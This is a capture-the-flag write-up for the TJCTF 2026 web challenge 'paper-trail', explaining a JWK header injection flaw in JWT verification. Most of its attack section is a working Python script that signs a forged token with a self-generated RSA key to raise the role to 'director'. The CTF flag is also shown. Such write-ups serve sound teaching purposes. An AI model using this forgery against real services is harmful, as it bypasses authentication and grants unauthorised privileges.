---
title: "TJCTF2026-web/paper-trail"
description: "CTF writeup - web/paper-trail (TJCTF 2026)"
date: 2026-05-17
tags: [CTF, Web, TJCTF]
category: "TJCTF 2026"
cover: ./cover.png
pinned: false
draft: false
---

When visiting the challenge, the application shows a check-in form:

![](./image.png)

Enter any name. The request is sent to the endpoint:

![](./image-1.png)

The server returns a `302 Found` redirect and sets a cookie:

This shows the application uses a JWT to store the visitor's badge information.

### JWT analysis

The cookie received:

```text
paper_badge=eyJhbGciOiJSUzI1NiIsImtpZCI6ImZyb250LWRlc2stMjAyNiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYXBlci10cmFpbC1vZmZpY2UiLCJhdWQiOiJwYXBlci10cmFpbC12aXNpdG9ycyIsInN1YiI6IjcyMDQyZjllMDYyNTA2NGYiLCJuYW1lIjoiZnJvZyIsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzc5MDE3MzE3LCJuYmYiOjE3NzkwMTczMTcsImV4cCI6MTc3OTAyMDkxN30.ecfs2Jj38eZalf7OUzFa9OJWtEcUKyEyhHW3mFRWlWhlFgUD12jZGlh9Hhy1O-iZ8knBIgTRq2qu5GMSX5noo_JMUgJVeNcVq7v5hw5f0QZmZ2VSJSC5MPEgOSZUNNUvYv5TamSZ_khXVFBSJGYPifbIufrAHwURivNk7YI8AMaf0VBvAkihiUPWrGRDQT5ZOFOe4wwjKS6AvmcvnOr-g3qUH-cDZs3Mns3ne1ZJZuwyDYfTv1PbLLG6JRrmdcQWYL7BysI1RafCVgoARaJVpH3YIRW5XUI44JTU7LXrYrCQZUxufTrcHWCkL981APqw2vqGcPZcrDFR22FwBXjPTw
```

The JWT has 3 parts:

```text
header.payload.signature
```

Decoding the initial JWT, we see the payload has content similar to:

```json
{
  "iss": "paper-trail-office",
  "aud": "paper-trail-visitors",
  "sub": "72042f9e0625064f",
  "name": "frog",
  "role": "visitor",
  "iat": 1779017317,
  "nbf": 1779017317,
  "exp": 1779020917
}
```

Access the `VAULT DRAWER`:

![](./image-2.png)

With `role = visitor` it won't return the flag because the permission is insufficient.

The goal is to craft a valid JWT with `role = director`

### Bug analysis

The initial JWT uses the algorithm:

```json
{
  "alg": "RS256",
  "kid": "front-desk-2026",
  "typ": "JWT"
}
```

With `RS256`, the server normally has to verify the signature using a fixed public key on the backend.

However, this challenge has a JWK header injection bug. The JWT allows the header to contain a `jwk` field.

### Forging a new JWT

```python
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

old_token = "eyJhbGciOiJSUzI1NiIsImtpZCI6ImZyb250LWRlc2stMjAyNiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwYXBlci10cmFpbC1vZmZpY2UiLCJhdWQiOiJwYXBlci10cmFpbC12aXNpdG9ycyIsInN1YiI6IjcyMDQyZjllMDYyNTA2NGYiLCJuYW1lIjoiZnJvZyIsInJvbGUiOiJ2aXNpdG9yIiwiaWF0IjoxNzc5MDE3MzE3LCJuYmYiOjE3NzkwMTczMTcsImV4cCI6MTc3OTAyMDkxN30.ecfs2Jj38eZalf7OUzFa9OJWtEcUKyEyhHW3mFRWlWhlFgUD12jZGlh9Hhy1O-iZ8knBIgTRq2qu5GMSX5noo_JMUgJVeNcVq7v5hw5f0QZmZ2VSJSC5MPEgOSZUNNUvYv5TamSZ_khXVFBSJGYPifbIufrAHwURivNk7YI8AMaf0VBvAkihiUPWrGRDQT5ZOFOe4wwjKS6AvmcvnOr-g3qUH-cDZs3Mns3ne1ZJZuwyDYfTv1PbLLG6JRrmdcQWYL7BysI1RafCVgoARaJVpH3YIRW5XUI44JTU7LXrYrCQZUxufTrcHWCkL981APqw2vqGcPZcrDFR22FwBXjPTw"

payload = jwt.decode(
    old_token,
    options={
        "verify_signature": False,
        "verify_exp": False,
        "verify_aud": False
    }
)

payload["role"] = "director"

key = rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048
)

private_pem = key.private_bytes(
    encoding=serialization.Encoding.PEM,
    format=serialization.PrivateFormat.PKCS8,
    encryption_algorithm=serialization.NoEncryption()
)

public_numbers = key.public_key().public_numbers()

def b64url_uint(n):
    return jwt.utils.base64url_encode(
        n.to_bytes((n.bit_length() + 7) // 8, "big")
    ).decode()

jwk = {
    "kty": "RSA",
    "e": b64url_uint(public_numbers.e),
    "n": b64url_uint(public_numbers.n)
}

headers = {
    "alg": "RS256",
    "typ": "JWT",
    "kid": "front-desk-2026",
    "jwk": jwk
}

new_token = jwt.encode(
    payload,
    private_pem,
    algorithm="RS256",
    headers=headers
)

print(new_token)
```

The script generates a new JWT with `role = director` and a header containing a `jwk` public key that we created ourselves.

Replace with the new token:

![](./image-3.png)

### Flag

```text
tjctf{7h47_is_4_nic3_k3yc4rd_y0u_g07_7h3r3}
```
